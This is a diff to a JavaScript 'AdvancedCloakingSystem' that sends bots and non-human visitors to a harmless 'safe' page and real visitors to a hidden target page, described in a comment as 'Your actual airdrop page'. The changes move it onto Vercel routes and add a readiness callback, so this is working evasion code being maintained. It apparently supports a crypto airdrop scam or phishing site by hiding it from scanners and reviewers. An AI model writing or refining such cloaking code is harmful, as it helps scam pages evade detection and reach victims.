@@ -2,8 +2,8 @@ class AdvancedCloakingSystem {
     constructor(config = {}) {
         // Configuration – adjust these URLs to match your site
         this.config = {
-            safePageUrl: config.safePageUrl || '/safe.html',      // Must NOT be the same as entry page
-            targetPageUrl: config.targetPageUrl || '/target.html',
+            safePageUrl: config.safePageUrl || '/safe',      // Must NOT be the same as entry page
+            targetPageUrl: config.targetPageUrl || '/target',
             strictnessLevel: config.strictnessLevel || 92,        // 0-100, higher = more aggressive
             debugMode: config.debugMode || false,
             // Optional: use external IP service if server endpoints not available
@@ -551,18 +551,24 @@ class AdvancedCloakingSystem {
             };
             sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));
 
+            // Cancel the safety timeout if it exists
+            if (typeof window.cloakingReady === 'function') {
+                window.cloakingReady();
+            }
+
             if (result.showSafe) {
                 this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
-                // Use simple redirect for all non-human traffic
                 window.location.replace(this.config.safePageUrl);
             } else {
                 this.log(`Serving target page: ${this.config.targetPageUrl}`, 'success');
-                // Redirect to target (simplest, most reliable)
                 window.location.replace(this.config.targetPageUrl);
             }
         } catch (error) {
             this.log(`Cloaking error: ${error.message}`, 'error');
             // Fail safe – show safe page
+            if (typeof window.cloakingReady === 'function') {
+                window.cloakingReady();
+            }
             window.location.href = this.config.safePageUrl;
         }
     }
@@ -576,13 +582,13 @@ class AdvancedCloakingSystem {
 
 // ---------- Auto‑initialize ----------
 (function() {
-    // Configuration – UPDATE THESE TO MATCH YOUR SITE
+    // Configuration – matches Vercel routes
     const cloakingSystem = new AdvancedCloakingSystem({
-        safePageUrl: '/safe.html',           // Must be different from entry page
-        targetPageUrl: '/target.html',       // Your actual airdrop page
+        safePageUrl: '/safe',           // Now uses the route, not .html
+        targetPageUrl: '/target',       // Now uses the route
         strictnessLevel: 92,
-        debugMode: false,                     // Set to true for console logs
-        usePublicIpService: false              // Set true if you haven't implemented /api/get-client-ip
+        debugMode: false,                // Set to true for console logs
+        usePublicIpService: false        // Set true if you haven't implemented /api/get-client-ip
     });
 
     if (document.readyState === 'loading') {
